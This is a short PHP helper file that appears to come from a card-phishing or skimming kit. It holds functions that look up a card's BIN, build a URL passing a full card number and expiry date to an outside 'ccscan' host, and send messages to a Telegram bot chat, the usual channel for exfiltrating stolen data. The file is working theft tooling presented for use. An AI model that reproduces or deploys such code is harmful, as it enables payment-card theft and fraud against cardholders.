<?php
include 'configuration.php';

function getBin($bin){
    global $bincode;
    
    $data = file_get_contents("https://api.bincodes.com/bin/?api_key=$bincode&bin=$bin&format=json");
    return $data;
}

function getScan($cc,$exp){
    $cc = str_replace(' ','',$cc);
    return "https://progamer-data.gay/ccscan/index.php?l=$cc&p=$exp&d=M4GWaker";
}

function sendMessage($message) {
    global $token,$chatid;
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
?>